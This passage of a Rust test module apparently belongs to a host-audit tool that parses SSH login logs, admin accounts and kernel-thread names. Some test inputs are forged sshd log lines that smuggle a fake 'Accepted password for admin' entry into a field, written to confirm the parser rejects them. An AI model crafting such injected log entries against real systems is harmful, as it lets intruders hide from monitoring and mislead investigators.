            "Oct 12 02:11:40 host sshd[1]: Accepted password for a from 6.6.6.6 port 1 from 9.9.9.9 port 2",
            "Oct 12 02:11:40 host sshd[1]: Accepted password for a b from 6.6.6.6 port 1 ssh2",
            "Oct 12 02:11:40 host sshd[1]:  Accepted password for a from 6.6.6.6 port 1 ssh2",
        ];
        for l in forged {
            assert!(accepted_login(l).is_none(), "{l}");
        }
    }

    #[test]
    fn uid_min_and_admin_groups_are_read_from_the_system_files() {
        assert_eq!(parse_uid_min("# c\nUID_MIN 500\nUID_MAX 60000\n"), 500);
        assert_eq!(parse_uid_min("UID_MIN\t1000\n"), 1000);
        assert_eq!(parse_uid_min(""), 1000);
        let passwd = "ops:x:1001:1001::/home/ops:/bin/bash\nci:x:1002:27::/home/ci:/bin/bash\nweb:x:1003:1003::/home/web:/bin/bash\n";
        let group = "sudo:x:27:ops\nwheel:x:10:\nusers:x:100:web\n";
        let a = admin_accounts(passwd, group);
        assert!(a.contains("ops"), "member of sudo");
        assert!(a.contains("ci"), "primary group is sudo");
        assert!(!a.contains("web"));
        // A lower UID_MIN makes accounts visible that 1000 would hide.
        let low = "svc:x:600:600::/home/svc:/bin/bash\n";
        assert!(parse_passwd(low, 1000).is_empty());
        assert_eq!(parse_passwd(low, 500).len(), 1);
        // noshell counts as no login.
        assert!(parse_passwd("a:x:1001:1001::/h:/sbin/noshell\n", 1000).is_empty());
    }

    #[test]
    fn kernel_thread_names_on_a_real_program_are_recognised() {
        for c in [
            "[kworker/0:1Z]",
            "kworker/0:1",
            "ksoftirqd/2",
            "[migration/0]",
            "rcu_sched",
        ] {
            assert!(looks_like_kthread(c), "{c}");
        }
        for c in ["php-fpm", "nginx", "xmrig", "worker"] {
            assert!(!looks_like_kthread(c), "{c}");
        }
    }

    #[test]
    fn only_sshds_own_tag_counts_and_the_first_one_wins() {
        let log = "Oct 12 02:00:00 sshd-box sshd[9]: Accepted password for real from 203.0.113.7 port 1 ssh2\n\
                   Oct 12 02:00:01 h sshd[1]: Failed password for invalid user x sshd[1]: Accepted password for admin from 1.1.1.1 port 1 ssh2 from 9.9.9.9 port 5 ssh2\n\
                   Oct 12 02:00:02 h notsshd[2]: Accepted password for fake from 5.5.5.5 port 1 ssh2\n";
        let l = parse_ssh_logins(log);
        let who: Vec<&str> = l.iter().map(|x| x.user.as_str()).collect();
        assert_eq!(who, ["real"], "{l:?}");
    }
}
